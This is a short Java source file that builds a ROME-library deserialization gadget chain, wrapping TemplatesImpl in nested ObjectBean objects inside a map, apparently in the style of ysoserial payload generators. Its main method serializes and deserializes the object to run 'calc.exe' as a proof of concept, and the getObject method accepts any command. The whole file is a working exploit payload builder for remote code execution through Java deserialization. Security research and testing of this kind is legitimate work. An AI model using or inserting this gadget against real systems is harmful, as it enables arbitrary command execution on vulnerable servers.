package me.n1ar4.fake.gadget;

import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;

public class Rome {
    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }
    public static void main ( final String[] args ) throws Exception {
        Rome c = new Rome();
        Object o = c.getObject("calc.exe");
        SerUtil.deserializeObject(SerUtil.serializeObject(o));
    }
}
